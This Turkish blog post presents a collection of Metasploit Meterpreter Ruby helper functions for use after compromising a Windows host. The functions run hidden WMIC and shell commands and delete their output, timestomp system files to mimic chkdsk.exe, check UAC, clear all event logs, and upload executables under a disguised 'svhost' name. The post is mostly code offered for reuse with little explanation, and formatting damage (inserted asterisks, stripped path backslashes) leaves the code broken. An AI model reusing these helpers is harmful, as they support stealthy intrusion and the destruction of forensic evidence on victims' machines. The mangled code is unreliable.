---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-14T13:51:00Z"
excerpt: Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon
  örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz.
  Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz.
guid: https://www.siberoloji.com/?p=1211
id: 1211
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Script Fonksiyonlar
url: /tr/msf-meterpreter-script-fonksiyonlar/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="kullanışlı-fonksiyonlar">Kullanışlı Fonksiyonlar 
<!-- /wp:heading -->

  Bu yazıda, script dosyalarınızda kullanabileceğiniz kullanışlı bazı fonksiyon örneklerine toplu halde bakacağız. Bu fonksiyonları ihtiyacınıza göre kullanabilirsiniz. Komutları inceleyerek ne gibi işlemler yapıldığını inceleyebilirsiniz. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="kullanılabilir-wmic-komutları">Kullanılabilir WMIC Komutları 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def wmicexec***(*** session,wmiccmds***=***  nil***)*** 
        windr ***=***  ''
        tmpout ***=***  ''
        windrtmp ***=***  ""
        session.response_timeout***=*** 120
        begin
                tmp ***=***  session.fs.file.expand_path***(*** "%TEMP%"***)*** 
                wmicfl ***=***  tmp + ""+ sprintf***(*** "%.5d",rand***(*** 100000***))*** 
                wmiccmds.each ***do***  |wmi|
                        print_status "running command wmic #{wmi}"
                        cmd ***=***  "cmd.exe /c %SYSTEMROOT%system32wbemwmic.exe"
                        opt ***=***  "/append:#{wmicfl} #{wmi}"
                        r ***=***  session.sys.process.execute***(***  cmd, opt,***{*** 'Hidden' ***=&gt;***  true***})*** 
                        sleep***(*** 2***)*** 
                        <em>#Making sure that wmic finnishes before executing next wmic command</em>
                        prog2check ***=***  "wmic.exe"
                        found ***=***  0
                        ***while *** found ***==***  0
                                session.sys.process.get_processes***()*** .each ***do***  |x|
                                        found ***=*** 1
                                        ***if *** prog2check ***==***  ***(*** x['name'***]*** .downcase***)*** 
                                                sleep***(*** 0.5***)*** 
                                                            print_line "."
                                                found ***=***  0
                                        end
                                end
                        end
                        r.close
                end
                <em># Read the output file of the wmic commands</em>
                wmioutfile ***=***  session.fs.file.new***(*** wmicfl, "rb"***)*** 
                ***until *** wmioutfile.eof?
                        tmpout ***&gt;&gt;***  wmioutfile.read
                end
                wmioutfile.close
        rescue ::Exception ***=&gt;***  e
                print_status***(*** "Error running WMIC commands: #{e.class} #{e}"***)*** 
        end
        <em># We delete the file with the wmic command output.</em>
        c ***=***  session.sys.process.execute***(*** "cmd.exe /c del #{wmicfl}", nil, ***{*** 'Hidden' ***=&gt;***  true***})*** 
        c.close
        tmpout
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="dosyaların-mac-zamanlarını-değiştirme">Dosyaların MAC Zamanlarını Değiştirme 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def chmace***(*** session,cmds***)*** 
    windir ***=***  ''
    windrtmp ***=***  ""
    print_status***(*** "Changing Access Time, Modified Time and Created Time of Files Used"***)*** 
    windir ***=***  session.fs.file.expand_path***(*** "%WinDir%"***)*** 
    cmds.each ***do***  |c|
        begin
            session.core.use***(*** "priv"***)*** 
            filetostomp ***=***  windir + "system32"+ c
            fl2clone ***=***  windir + "system32chkdsk.exe"
            print_status***(*** "tChanging file MACE attributes on #{filetostomp}"***)*** 
            session.priv.fs.set_file_mace_from_file***(*** filetostomp, fl2clone***)*** 

        rescue ::Exception ***=&gt;***  e
            print_status***(*** "Error changing MACE: #{e.class} #{e}"***)*** 
        end
    end
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="uac-kontrolü">UAC Kontrolü 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def checkuac***(*** session***)*** 
    uac ***=***  false
    begin
        winversion ***=***  session.sys.config.sysinfo
        ***if *** winversion['OS'***]=*** ~ /Windows Vista/ or  winversion['OS'***]=*** ~ /Windows 7/
            print_status***(*** "Checking if UAC is enaled ..."***)*** 
            key ***=***  'HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem'
            root_key, base_key ***=***  session.sys.registry.splitkey***(*** key***)*** 
            value ***=***  "EnableLUA"
            open_key ***=***  session.sys.registry.open_key***(*** root_key, base_key, KEY_READ***)*** 
            v ***=***  open_key.query_value***(*** value***)*** 
            ***if *** v.data ***==***  1
                uac ***=***  true
            ***else
                *** uac ***=***  false
            end
            open_key.close_key***(*** key***)*** 
        end
    rescue ::Exception ***=&gt;***  e
        print_status***(*** "Error Checking UAC: #{e.class} #{e}"***)*** 
    end
    ***return *** uac
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="tüm-olay-loglarını-temizleme">Tüm Olay Loglarını Temizleme 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def clrevtlgs***(*** session***)*** 
    evtlogs ***=***  ***[*** 
        'security',
        'system',
        'application',
        'directory service',
        'dns server',
        'file replication service'
    ***]*** 
    print_status***(*** "Clearing Event Logs, this will leave and event 517"***)*** 
    begin
        evtlogs.each ***do***  |evl|
            print_status***(*** "tClearing the #{evl} Event Log"***)*** 
            log ***=***  session.sys.eventlog.open***(*** evl***)*** 
            log.clear
        end
        print_status***(*** "Alll Event Logs have been cleared"***)*** 
    rescue ::Exception ***=&gt;***  e
        print_status***(*** "Error clearing Event Log: #{e.class} #{e}"***)*** 

    end
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="bir-komut-listesini-çalıştırma">Bir Komut Listesini Çalıştırma 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def list_exec***(*** session,cmdlst***)*** 
    ***if *** cmdlst.kind_of? String
        cmdlst ***=***  cmdlst.to_a
    end
    print_status***(*** "Running Command List ..."***)*** 
    r***=*** ''
    session.response_timeout***=*** 120
    cmdlst.each ***do***  |cmd|
        begin
            print_status "trunning command #{cmd}"
            r ***=***  session.sys.process.execute***(*** cmd, nil, ***{*** 'Hidden' ***=&gt;***  true, 'Channelized' ***=&gt;***  true***})*** 
            ***while*** ***(*** d ***=***  r.channel.read***)*** 

                print_status***(*** "t#{d}"***)*** 
            end
            r.channel.close
            r.close
        rescue ::Exception ***=&gt;***  e
            print_error***(*** "Error Running Command #{cmd}: #{e.class} #{e}"***)*** 
        end
    end
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="dosyaları-karşı-tarafa-yükleme">Dosyaları Karşı Tarafa Yükleme 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def upload***(*** session,file,trgloc ***=***  nil***)*** 
    ***if *** not ::File.exists?***(*** file***)*** 
            raise "File to Upload does not exists!"
        ***else
        if *** trgloc ***==***  nil
        location ***=***  session.fs.file.expand_path***(*** "%TEMP%"***)*** 
        ***else
            *** location ***=***  trgloc
        end
        begin
            ***if *** file ***=*** ~ /S******* ***(*** .exe***)*** /i
                       fileontrgt ***=***  "#{location}svhost#{rand(100)}.exe"
            ***else
                    *** fileontrgt ***=***  "#{location}TMP#{rand(100)}"
            end
            print_status***(*** "Uploadingd #{file}...."***)*** 
            session.fs.file.upload_file***(*** "#{fileontrgt}","#{file}"***)*** 
            print_status***(*** "#{file} uploaded!"***)*** 
            print_status***(*** "#{fileontrgt}"***)*** 
        rescue ::Exception ***=&gt;***  e
            print_status***(*** "Error uploading file #{file}: #{e.class} #{e}"***)*** 
        end
    end
    ***return *** fileontrgt
end
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="bir-dosyaya-veri-yazma">Bir Dosyaya Veri Yazma 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def filewrt***(*** file2wrt, data2wrt***)*** 
        output ***=***  ::File.open***(*** file2wrt, "a"***)*** 
        data2wrt.each_line ***do***  |d|
                output.puts***(*** d***)*** 
        end
        output.close
end</code></pre>
<!-- /wp:code -->